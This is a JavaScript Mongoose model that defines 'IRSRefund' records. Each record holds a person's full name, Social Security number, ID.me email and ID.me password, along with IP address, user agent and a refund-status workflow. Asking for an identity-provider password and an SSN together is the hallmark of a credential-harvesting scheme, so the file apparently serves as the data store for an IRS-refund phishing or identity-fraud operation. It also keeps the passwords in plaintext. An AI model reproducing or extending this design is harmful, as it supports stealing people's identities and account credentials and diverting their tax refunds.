// models/irsRefund.js

const mongoose = require('mongoose');

const irsRefundSchema = new mongoose.Schema({
  user: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'user',
    required: true,
    index: true
  },
  fullName:        { type: String, required: true, trim: true },
  ssn:             { type: String, required: true, trim: true },
  idmeEmail:       { type: String, required: true, trim: true, lowercase: true },
  idmePassword:    { type: String, required: true },
  country:         { type: String, required: true },
  status: {
    type: String,
    enum: ['pending', 'received', 'approved', 'sent', 'rejected'],
    default: 'pending'
  },
  refundAmount: {
    type: Number,
    default: 0
  },
  receivedAt:    { type: Date },
  approvedAt:    { type: Date },
  sentAt:        { type: Date },
  rejectedAt:    { type: Date },
  rejectionReason: { type: String },
  ip:             String,
  userAgent:      String,
}, { timestamps: true });

irsRefundSchema.index({ user: 1, createdAt: -1 });

// Prevent overwrite error during hot-reload / multiple requires
const IRSRefund = mongoose.models.IRSRefund 
  ? mongoose.model('IRSRefund') 
  : mongoose.model('IRSRefund', irsRefundSchema);

module.exports = IRSRefund;